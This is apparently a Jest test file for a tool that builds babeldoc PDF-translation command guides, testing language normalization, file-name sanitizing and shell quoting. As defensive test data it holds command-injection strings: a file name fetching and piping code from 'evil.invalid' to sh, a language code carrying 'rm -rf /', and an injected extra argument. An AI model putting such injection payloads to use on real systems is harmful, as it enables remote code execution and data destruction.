import {
  BABELDOC_GUIDE_MAX_CODE_POINTS,
  BABELDOC_SOURCE_FILENAME_MAX_CODE_POINTS,
  createBabelDocWorkflow,
  normalizeBabelDocLanguage,
  normalizeBabelDocPdfFileName,
  quotePosixShellArgument,
  quotePowerShellArgument
} from '../BabelDocWorkflow';

describe('BabelDocWorkflow', () => {
  it.each([
    ['en', 'en'],
    ['zh-CN', 'zh-CN'],
    ['zh_cn', 'zh-CN'],
    ['zh-TW', 'zh-TW'],
    ['ja', 'ja'],
    ['ko', 'ko'],
    ['fr', 'fr'],
    ['es', 'es'],
    ['ru', 'ru'],
    ['de', 'de'],
    ['pt', 'pt']
  ])('normalizes the required language mapping %s to %s', (input, expected) => {
    expect(normalizeBabelDocLanguage(input, 'target')).toBe(expected);
  });

  it('resolves source auto to the documented CLI default without treating it as detection', () => {
    const workflow = createBabelDocWorkflow({
      sourceFileName: 'paper.pdf',
      sourceLanguage: 'auto',
      targetLanguage: 'zh-CN'
    });

    expect(workflow.sourceLanguage).toBe('en');
    expect(workflow.content).toContain('Source language `auto` was resolved to `en`');
    expect(workflow.content).toContain('does not claim or enable automatic language detection');
    expect(workflow.content).not.toContain("--lang-in 'auto'");
  });

  it('creates bounded PowerShell and POSIX commands with absolute-path placeholders', () => {
    const workflow = createBabelDocWorkflow({
      sourceFileName: 'research paper.pdf',
      sourceLanguage: 'EN_us',
      targetLanguage: 'ZH_tw'
    });

    expect(workflow).toEqual(expect.objectContaining({
      filename: 'research paper.babeldoc-guide.md',
      sourceFileName: 'research paper.pdf',
      sourceLanguage: 'en',
      targetLanguage: 'zh-TW'
    }));
    expect(workflow.content).toContain(
      "babeldoc --files 'C:\\ABSOLUTE\\PATH\\research paper.pdf' --lang-in 'en' --lang-out 'zh-TW'"
    );
    expect(workflow.content).toContain(
      "babeldoc --files '/absolute/path/research paper.pdf' --lang-in 'en' --lang-out 'zh-TW'"
    );
    expect(workflow.content).toContain('did not upload the PDF');
    expect(workflow.content).toContain('did not upload the PDF, install BabelDOC, run a command');
    expect(workflow.content).toContain('run the command yourself');
    expect(workflow.content).not.toMatch(/api[-_ ]?key/iu);
    expect(Array.from(workflow.content).length).toBeLessThanOrEqual(BABELDOC_GUIDE_MAX_CODE_POINTS);
  });

  it('normalizes hostile file names before inserting them into either command', () => {
    const workflow = createBabelDocWorkflow({
      sourceFileName: "..\\draft'; $(Invoke-WebRequest https://evil.invalid) | sh #.PDF",
      sourceLanguage: 'en',
      targetLanguage: 'de'
    });

    expect(workflow.sourceFileName).toMatch(/^[\p{L}\p{N}._ ()-]+\.pdf$/u);
    expect(workflow.sourceFileName).not.toMatch(/[';$|#\\/]/u);
    expect(workflow.content).not.toContain('Invoke-WebRequest');
    expect(workflow.content).not.toContain('evil.invalid');
    expect(workflow.content).not.toContain('| sh');
    expect(workflow.content.match(/^babeldoc .+$/gmu)).toHaveLength(2);
  });

  it('quotes apostrophes safely for both supported shell forms', () => {
    expect(quotePowerShellArgument("C:\\Docs\\O'Brien.pdf"))
      .toBe("'C:\\Docs\\O''Brien.pdf'");
    expect(quotePosixShellArgument("/docs/O'Brien.pdf"))
      .toBe("'/docs/O'\"'\"'Brien.pdf'");
  });

  it.each([
    ['line\nbreak'],
    ['line\rbreak'],
    ['nul\0byte'],
    ['']
  ])('rejects unsafe shell arguments: %j', value => {
    expect(() => quotePowerShellArgument(value)).toThrow('single-line');
    expect(() => quotePosixShellArgument(value)).toThrow('single-line');
  });

  it('rejects file-name newlines, non-PDF files, target auto, and injected language codes', () => {
    expect(() => normalizeBabelDocPdfFileName('paper\n.pdf')).toThrow('control characters');
    expect(() => normalizeBabelDocPdfFileName('paper.pdf.exe')).toThrow('only be created for PDF');
    expect(() => normalizeBabelDocLanguage('auto', 'target')).toThrow('automatic target');
    expect(() => normalizeBabelDocLanguage('en; rm -rf /', 'source')).toThrow('Unsupported');
    expect(() => normalizeBabelDocLanguage('zh-CN\n--files evil.pdf', 'target'))
      .toThrow('Invalid');
  });

  it('bounds normalized source and exported file names', () => {
    const workflow = createBabelDocWorkflow({
      sourceFileName: `${'a'.repeat(500)}.pdf`,
      sourceLanguage: 'en',
      targetLanguage: 'fr'
    });

    expect(Array.from(workflow.sourceFileName).length)
      .toBeLessThanOrEqual(BABELDOC_SOURCE_FILENAME_MAX_CODE_POINTS);
    expect(workflow.filename.endsWith('.babeldoc-guide.md')).toBe(true);
    expect(workflow.filename.length).toBeLessThan(160);
  });
});
